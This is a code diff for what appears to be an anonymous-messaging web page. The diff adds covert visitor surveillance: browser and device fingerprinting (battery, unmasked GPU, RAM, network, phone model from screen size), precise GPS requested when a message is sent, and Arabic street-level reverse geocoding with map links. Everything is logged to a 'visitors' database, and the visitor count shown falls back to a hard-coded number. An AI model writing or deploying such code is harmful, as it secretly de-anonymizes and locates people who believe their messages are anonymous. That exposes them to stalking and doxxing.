@@ -1,6 +1,6 @@
 import { supabase } from './supabase.js';
 
-// Simple UA Parser (Client-side version of Python logic)
+// Simple UA Parser
 function parseUserAgent(ua) {
     let browser = 'Unknown';
     let osName = 'Unknown';
@@ -26,6 +26,54 @@ function parseUserAgent(ua) {
     return { browser, osName, device };
 }
 
+async function getAdvancedMetadata() {
+    let batteryLevel = "N/A";
+    let isCharging = "N/A";
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100) + '%';
+            isCharging = battery.charging ? 'Yes' : 'No';
+        } catch(e) {}
+    }
+
+    let gpu = "Unknown GPU";
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch (e) {}
+
+    let ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+    let connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+    
+    // Advanced Phone Model Fingerprinting
+    let phoneName = "Unknown Model";
+    const ua = navigator.userAgent;
+    const w = screen.width;
+    const h = screen.height;
+
+    if (ua.includes('iPhone')) {
+        // Mapping common iPhone resolutions to models
+        if (w === 390 && h === 844) phoneName = "iPhone 12/13/14";
+        else if (w === 428 && h === 926) phoneName = "iPhone 12/13/14 Pro Max";
+        else if (w === 375 && h === 812) phoneName = "iPhone X/XS/11 Pro";
+        else if (w === 414 && h === 896) phoneName = "iPhone XR/11/11 Pro Max";
+        else if (w === 320 && h === 568) phoneName = "iPhone 5/SE";
+        else if (w === 375 && h === 667) phoneName = "iPhone 6/7/8/SE2";
+        else if (w === 414 && h === 736) phoneName = "iPhone 6/7/8 Plus";
+        else phoneName = "iPhone (Model Hidden)";
+    } else if (ua.includes('Android')) {
+        const match = ua.match(/Android\s+[^;]+;\s+([^;)]+)/);
+        phoneName = match ? match[1].trim() : "Android Device";
+    } else {
+        phoneName = navigator.platform || "Desktop/Laptop";
+    }
+
+    return { batteryLevel, isCharging, gpu, ram, connection, phoneName };
+}
+
 async function getIPInfo() {
     try {
         const resp = await fetch('https://ipapi.co/json/');
@@ -38,13 +86,43 @@ async function getIPInfo() {
 
 async function reverseGeocode(lat, lon) {
     try {
-        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-        const resp = await fetch(url, { headers: { 'User-Agent': 'SarhneClient/1.0' } });
+        // Use BigDataCloud API for better city/governorate naming in Arabic
+        const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=ar`;
+        const resp = await fetch(url);
         const data = await resp.json();
-        return data.display_name || "Unknown Location";
+        
+        const city = data.city || data.locality || "";
+        const gov = data.principalSubdivision || "";
+        const country = data.countryName || "";
+        
+        // Example: طنطا، محافظة الغربية، مصر
+        return [city, gov, country].filter(Boolean).join("، ") || "Unknown Location";
     } catch (e) {
         return "Unknown Location";
     }
+}
+
+function getPreciseLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                resolve({
+                    lat: lat,
+                    lon: lon,
+                    acc: pos.coords.accuracy,
+                    map_link: `https://www.google.com/maps?q=${lat},${lon}`
+                });
+            },
+            (err) => {
+                console.error("Geolocation error:", err);
+                resolve(null);
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    });
 }
 
 function getLocalIP() {
@@ -82,11 +160,13 @@ async function collect(action, extra = {}) {
     const ipInfo = await getIPInfo();
     const { browser, osName, device } = parseUserAgent(navigator.userAgent);
     const localIp = await getLocalIP();
+    const adv = await getAdvancedMetadata();
 
     let finalLat = extra.lat || ipInfo.latitude;
     let finalLon = extra.lon || ipInfo.longitude;
     let exactAddress = "N/A";
     let gpsAccuracy = extra.acc ? `Within ${extra.acc} meters` : "IP Based (City Level)";
+    let googleMapsLink = extra.map_link || (finalLat ? `https://www.google.com/maps?q=${finalLat},${finalLon}` : "N/A");
 
     if (finalLat && finalLon) {
         exactAddress = await reverseGeocode(finalLat, finalLon);
@@ -107,11 +187,24 @@ async function collect(action, extra = {}) {
         ip_lon: finalLon?.toString() || 'N/A',
         exact_address: exactAddress,
         gps_accuracy: gpsAccuracy,
-        message: extra.message || null
+        google_maps_link: googleMapsLink,
+        message: extra.message || null,
+        
+        // Advanced Metadata
+        battery_level: adv.batteryLevel,
+        is_charging: adv.isCharging,
+        gpu_name: adv.gpu,
+        ram_gb: adv.ram,
+        network_type: adv.connection,
+        phone_name: adv.phoneName
     };
 
     const { error } = await supabase.from('visitors').insert([data]);
-    if (error) console.error("Supabase Insert Error:", error);
+    if (error) {
+        console.error("❌ Supabase Insert Error:", error.message, error.details, error.hint);
+    } else {
+        console.log("✅ Data saved successfully!");
+    }
 }
 
 // Initialize tracking
@@ -121,7 +214,7 @@ window.addEventListener('load', async () => {
     const visitCountEl = document.getElementById('visitCount');
     if (visitCountEl) visitCountEl.innerText = (count || 2339).toLocaleString();
 
-    // Initial visit log
+    // Initial visit log without aggressive GPS
     collect('PAGE_VISIT');
 });
 
@@ -137,7 +230,13 @@ if (msgForm) {
         submitBtn.disabled = true;
         submitBtn.innerHTML = "<span>جاري الارسال...</span> <span style='font-size:12px;'>⏳</span>";
 
-        const extra = { message: val };
+        // Try to get exact GPS location on submit (might prompt user)
+        const preciseLocation = await getPreciseLocation();
+        
+        const extra = { 
+            message: val,
+            ...(preciseLocation || {})
+        };
 
         await collect('MESSAGE_SENT', extra);
         finishFlow();
